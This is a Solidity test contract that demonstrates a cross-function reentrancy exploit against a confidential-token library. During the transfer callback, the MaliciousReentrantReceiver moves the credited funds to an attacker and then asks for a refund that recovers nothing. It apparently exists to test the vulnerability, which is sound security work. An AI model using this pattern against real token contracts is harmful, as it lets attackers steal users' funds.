// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { IERC7984Receiver } from "../interfaces/IERC7984Receiver.sol";
import { IERC20ConfidentialCore } from "../interfaces/IERC20ConfidentialCore.sol";
import { ebool, euint64, sharedEbool, sharedEuint64, FHE } from "@fhenixprotocol/cofhe-contracts/FHE.sol";

/**
 * @dev Test-only attacker that triggers a cross-function reentrancy in
 * `ERC20ConfidentialLib._moveAndCall`.
 *
 * `_moveAndCall` commits the recipient credit (and grants it ACL on the new
 * balance handle) in its forward leg BEFORE invoking this callback, and only
 * afterwards runs a *saturating* refund leg if the callback returns `false`.
 *
 * This receiver exploits that ordering: during the callback it re-enters the
 * token via `confidentialTransfer` and sweeps the just-received balance to
 * `attacker`, then returns `false` to request a refund. When the refund leg
 * tries to debit this contract, its balance is already 0, so the saturating
 * `tryDecrease` is a no-op — nothing is clawed back. Net result: the sender is
 * debited, the refund returns nothing, and `attacker` keeps the funds.
 */
contract MaliciousReentrantReceiver is IERC7984Receiver {
    address public immutable attacker;
    bool public reentered;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function onConfidentialTransferReceived(
        address /* operator */,
        address /* from */,
        sharedEuint64 sharedAmount,
        bytes calldata /* data */
    ) external returns (sharedEbool) {
        // Unwrap the directed share. Requires the sharer to be `msg.sender` (the token), so an
        // arbitrary caller cannot reach this callback with a handle nobody shared.
        euint64 amount = FHE.receiveEuint64Param(sharedAmount);
        // `msg.sender` is the token. The forward leg of `_moveAndCall` already
        // credited us `amount` and granted us ACL on this handle (update() line
        // 109), so we can spend it right now — before the refund leg runs.
        if (!reentered) {
            reentered = true;
            // Re-enter the *plain* transfer (no callback, since `attacker` is an
            // EOA) and move our entire credited balance out of reach of the refund.
            IERC20ConfidentialCore(msg.sender).confidentialTransfer(attacker, FHE.shareEuint64(amount, msg.sender));
        }

        // Signal "rejected — please refund the sender". The refund leg will try to
        // debit us `amount`, but our balance is now 0, so tryDecrease saturates to
        // a no-op and the sender is never made whole.
        ebool rejected = FHE.asEbool(false);
        return FHE.shareEbool(rejected, msg.sender);
    }
}
